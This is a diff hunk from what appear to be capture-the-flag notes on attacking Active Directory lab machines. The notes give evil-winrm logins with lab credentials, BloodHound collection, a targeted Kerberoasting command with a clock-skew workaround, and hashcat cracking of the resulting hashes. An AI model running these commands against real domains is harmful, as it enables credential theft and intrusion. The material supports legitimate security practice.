@@ -69,7 +69,7 @@ evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'abc@123'
 1. bloodhound-python -u name -p password -d domain.htb -ns ip -c all --zip
 The next part is different everytime
 2. If you have **WriteSPN**:
-    you need this: https://github.com/ShutdownRepo/targetedKerberoast (git clone it)
+    you need this: https://github.com/ShutdownRepo/targetedKerberoast (git clone it) \n
    a. ntpdate -u IP
    b. faketime "2025-06-09 16:22:00" python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --dc-ip 10.10.11.72
    c. hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
